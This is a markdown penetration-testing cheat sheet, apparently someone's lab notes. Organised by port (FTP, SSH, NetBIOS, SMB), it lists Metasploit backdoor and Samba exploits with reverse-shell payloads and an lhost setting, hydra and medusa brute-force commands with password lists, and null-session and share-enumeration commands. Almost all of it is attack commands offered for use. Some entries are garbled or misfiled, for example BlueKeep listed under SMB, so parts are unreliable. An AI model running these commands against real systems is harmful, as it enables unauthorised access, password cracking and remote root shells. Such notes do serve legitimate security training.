# Services

## Port 21 - FTP

Service | Exploit | Intent
:-: |:-|:-
VsFTPd 2.3.4 |msf> exploit/unix/ftp/vsftpd_234_backdoor | Rev Shell Root
ProFTPd 1.3.3 |msf> exloit/unix/ftp/proftpd_133c_backdoor | Rev Shell Root | msf
FTP | msf> auxiliary/scanner/ftp_version | Get version
FTP | msf> auxiliary/scanner/ftp/anonymous | Anonymous ?

---
## Port 22 - SSH

Service | Exploit | Intent
:-: |:-|:-
SSH | `$ hydra -L <userfile> -P <passfile> <@ip_host> ssh`  | Bruteforce
SSH | msf> auxiliary/scanner/ssh_version | Get version

---
## Port 139 - Netbios

Service | Exploit | Intent
:-: |:-|:-
netbios-ssn | msf> auxiliary/scanner/netbios/nbname  | Get hostname
netbios-ssn | `$ nmblookup -A <@ip>`  | Get hostname
netbios-ssn | `nbtstat -a @IP`<br/>`net view \\@IP`<br/>`net use z: \\@IP\c` | Get shares

---
## Port 445 - SMB

Service | Exploit | Intent
:-: |:-|:-
samba win7+ | msf> windows/rdp/cve_2019_0708_bluekeep_rce<br/>msf> windows/x64/meterpreter/reverse_tcp<br/>set target ...  | Rev Shell User
samba | msf> exploit/multi/samba/usermap_script<br/>msf> set PAYLOAD cmd/unix/reverse_netcat | Rev Shell Root

---
## Port 139/445 - Netbios / SMB

Service | Exploit | Intent | Comment
:-: |:-|:-|:-
samba|`$ enum4linux -A <@ip>`|Get hostname|versions samba 2.2.x are red flag
samba|`$ nmap --script=smb-enum* --script-args=unsafe=1 -T5 <@ip>IP`|Quick enumeration|
samba|`$ smbver.sh <@ip>`|Get version|script used to get smb version if nmap fails
samba|msf> scanner/smb/smb_version|Get version|
samba|`$ ngrep -i -d tap0 's.?a.?m.?b.?a$[[:digit:]]'`<br/>`$ smbclient -L \\\\@IP`|Get version|if all fails
samba|1. run wireshark<br/>2. smbmap -H @IP<br/>3. follow the tcp stream of the smb|Get version|note by 1kwstassak in reddit.com
samba|`$ smbmap -H <@ip> -R <sharename>`|Get shares|recusively display files in specific share
samba|`$ echo exit | smbclient -L \\\\<@ip>`|Get shares|
samba|`$ smbclient -L \\\\<@ip>\\<share>`|Get shares|more details in cherrytree file (info gathering / active / enumeration / services / 139.SMB)
samba|`$ smbclient -L //<@ip> -N`|Get shares|-N force the tool to not ask for password
samba|`$ nmap --script smb-enum-shares -p139,445 -T4 -Pn <@ip>`|Get shares|
samba|`$ smbclient -L \\\\<@ip>\\`|Get shares|more details in cherrytree file (info gathering / active / enumeration / services / 139.SMB)
samba|`$ smbmap -H <@ip>`|Check null sessions|Vuln : Win NT, 2000 XP (SMB1), samba unix srv<br/>Not : Win 2K3, XP SP2
samba|`$ rpcclient -U "" -N $IP`|Check null sessions|
samba|`$ smbclient //<@ip>P/IPC$ -N`|Check null sessions|success #:/smb>
samba|`$ enum -s <@ip>`|Exploit null sessions|shares of the machines
samba|`$ enum -U <@ip>`|Exploit null sessions|enumerate usersA133:AMJ133
samba|`$ enum -P <@ip>`|Exploit null sessions|check the passwd policy
samba|`$ enum4linux -A <@ip>`|Exploit null sessions|use all enum switches users/shares/passwd policies
samba|`# ./smardump.py <@ip>`|Exploit null sessions|/usr/share/doc/python3-impacket/examples/smardump.py
samba|`$ smbclient //$IP/share -U <username>`|Connect to username share|this step required u have a cred
samba|`$ smbclient -L \\\\<@ip>\\<share>`|Connect to anonymous share|more details in cherrytree file (info gathering / active / enumeration / services / 139.SMB)
samba|`$ smbclient -L //<@ip>/<share>`|Connect to anonymous share|
samba|`$ smbclient -L //<@ip>/<share\ name>`<br/>`smbclient -L //<@ip>/<"share name">`|Connect to anonymous share|If share has a space in between its name (eg "My shares")
samba|`$ rpcclient -U " " <@ip>`|Connect to anonymous share|Connect to null share which is the IPC$ share, enumerate with specific commands, refer to onenote
samba|`$ rpcclient -U " " -N <@ip>`|Connect to anonymous share|Connect to null share which is the IPC$ share, enumerate with specific commands, refer to onenote
samba|`$ nmap --script smb-vuln -p139,445 -T4 -Pn <@ip>`|Check vuln|
samba|msf> resource smb_checks.rc<br/>or:<br/>`# msfconsole -r /usr/share/metasploit-framework/scripts/resource/smb_checks.rc`|Check common security concerns|check common security concerns for SMB win<br/>MS08-067, MS17-010, SMB VER 1
samba|msf> resource smb_validate.rc<br/>or:<br/>`# msfconsole -r /usr/share/metasploit-framework/scripts/resource/smb_validate.rc`|Extra validation|after running the previous 
samba|`msf> use exploit/multi/samba/usermap_script`<br/>`msf> set lhost 192.168.0.X`<br/>`msf> set rhost $IP`<br/>`msf> run`|Multi exploits|
samba|`# medusa -h <@ip> -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt`<br/>`# nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt <@ip> -vvvv`<br/>`# nmap --script smb-brute <@ip>`|Bruteforce|Bruteforce login after enum users

